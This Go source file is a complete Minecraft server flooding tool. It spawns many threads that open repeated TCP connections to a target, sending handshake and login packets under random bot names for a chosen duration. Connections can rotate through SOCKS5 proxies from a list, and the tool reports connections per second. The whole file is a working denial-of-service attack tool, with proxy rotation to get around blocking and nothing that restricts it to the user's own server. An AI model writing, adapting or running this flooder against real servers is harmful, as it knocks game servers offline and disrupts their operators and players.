package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

var (
	connectionCount   int32
	failedConnections int32
	maxCPS            int32
	proxies           []string
)

type BotConfig struct {
	ip       string
	port     int
	protocol int
	mode     string
	lock     sync.Mutex
}

func generateRandomName(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func writeVarInt(buffer *bytes.Buffer, value int) {
	for {
		if (value & ^0x7F) == 0 {
			buffer.WriteByte(byte(value))
			break
		}
		buffer.WriteByte(byte((value & 0x7F) | 0x80))
		value >>= 7
	}
}

func createHandshakePacket(ip string, port int, protocolVersion int) []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0x00)
	writeVarInt(&packet, protocolVersion)
	ipData := []byte(ip)
	writeVarInt(&packet, len(ipData))
	packet.Write(ipData)
	packet.Write([]byte{byte(port >> 8), byte(port)})
	packet.Write([]byte{0x02})

	packetData := packet.Bytes()
	packetLength := len(packetData)
	var result bytes.Buffer
	writeVarInt(&result, packetLength)
	result.Write(packetData)
	return result.Bytes()
}

func createLoginStartPacket(username string) []byte {
	var packet bytes.Buffer
	writeVarInt(&packet, 0x00)
	usernameData := []byte(username)
	writeVarInt(&packet, len(usernameData))
	packet.Write(usernameData)

	packetData := packet.Bytes()
	packetLength := len(packetData)
	var result bytes.Buffer
	writeVarInt(&result, packetLength)
	result.Write(packetData)
	return result.Bytes()
}

func handleConnection(config *BotConfig, proxyAddress string) {
	name := generateRandomName(10) // Generate random bot name

	var conn net.Conn
	var err error

	if proxyAddress != "" {
		proxyParts := strings.Split(proxyAddress, ":")
		proxyIp := proxyParts[0]
		proxyPort := proxyParts[1]

		dialer, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%s", proxyIp, proxyPort), nil, proxy.Direct)
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		conn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	} else {
		conn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", config.ip, config.port))
		if err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}
	}
	defer conn.Close()

	switch config.mode {
	case "join":
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)
		loginStartPacket := createLoginStartPacket(name)

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

		if _, err := conn.Write(loginStartPacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	case "handshake":
		handshakePacket := createHandshakePacket(config.ip, config.port, config.protocol)

		if _, err := conn.Write(handshakePacket); err != nil {
			atomic.AddInt32(&failedConnections, 1)
			return
		}

	default:
		atomic.AddInt32(&failedConnections, 1)
		return
	}

	atomic.AddInt32(&connectionCount, 1)
}

func attackLoop(serverIp string, serverPort int, protocol int, duration int, threadId int, wg *sync.WaitGroup, method string, useProxies bool) {
	defer wg.Done()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		proxyAddress := ""
		if useProxies {
			proxyAddress = proxies[rand.Intn(len(proxies))]
		}

		config := &BotConfig{
			ip:       serverIp,
			port:     serverPort,
			protocol: protocol,
			mode:     method,
		}
		handleConnection(config, proxyAddress)
	}
}

func printConnectionCount(interval float64, duration int, done chan bool) {
	previousCount := int32(0)

	ticker := time.NewTicker(time.Duration(interval*1000) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentCount := atomic.LoadInt32(&connectionCount)
			currentCPS := currentCount - previousCount

			if currentCPS > maxCPS {
				atomic.StoreInt32(&maxCPS, currentCPS)
			}

			fmt.Printf("\rCPS: %d", currentCPS)
			previousCount = currentCount
		case <-done:
			return
		}
	}
}

func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Failed to open proxy file: %v\n", err)
		return nil
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("Failed to read proxy file: %v\n", err)
	}

	return proxies
}

func main() {
	flag.Usage = func() {
		fmt.Printf("Usage: %s <server_ip:port> <protocol> <duration_seconds> <thread_count> [method] [proxy_file]\n", os.Args[0])
		flag.PrintDefaults()
	}
	flag.Parse()

	args := flag.Args()
	if len(args) < 4 || len(args) > 6 {
		flag.Usage()
		return
	}

	serverAddress := strings.Split(args[0], ":")
	if len(serverAddress) != 2 {
		fmt.Println("Invalid format. Use <server_ip:port>")
		return
	}
	serverIp := serverAddress[0]
	serverPort, err := strconv.Atoi(serverAddress[1])
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	protocol, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Printf("Invalid protocol: %v\n", err)
		return
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		return
	}
	botCount, err := strconv.Atoi(args[3])
	if err != nil {
		fmt.Printf("Invalid thread count: %v\n", err)
		return
	}

	method := "join" // Default to "join" if not provided
	if len(args) >= 5 {
		if args[4] != "join" && args[4] != "handshake" {
			fmt.Println("Invalid method. Use 'join' or 'handshake'")
			return
		}
		method = args[4]
	}

	useProxies := false
	if len(args) == 6 {
		useProxies = true
		proxies = loadProxies(args[5])
		if proxies == nil {
			fmt.Println("Failed to load proxies.")
			return
		}
	}

	done := make(chan bool)
	go printConnectionCount(1.0, duration, done)

	var wg sync.WaitGroup
	for i := 0; i < botCount; i++ {
		wg.Add(1)
		go attackLoop(serverIp, serverPort, protocol, duration, i, &wg, method, useProxies)
	}

	wg.Wait()
	close(done)
}